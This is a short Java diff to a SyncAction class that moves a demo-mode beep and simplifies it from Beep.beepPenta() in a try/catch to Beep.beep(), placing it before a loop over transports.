@@ -104,23 +104,14 @@ public abstract class SyncAction extends SubActionSlow {
 			return false;
 		}
 
-		if (Cfg.DEMO) {
-			// Questa chiamata da una RunTimeException
-			// Toast.makeText(Status.getAppContext(), "Sync action",
-			// Toast.LENGTH_LONG).show();
-			try {
-				Beep.beepPenta();
-			} catch (Exception e) {
-				if (Cfg.EXCEPTION) {
-					Check.log(e);
-				}
-			}
-		}
-
 		// moduleManager.reload(AgentType.AGENT_DEVICE);
 		moduleManager.resetIncrementalLogs();
 
 		boolean ret = false;
+		
+		if (Cfg.DEMO) {
+			Beep.beep();
+		}
 
 		for (int i = 0; i < transports.size(); i++) {
 			final Transport transport = (Transport) transports.elementAt(i);
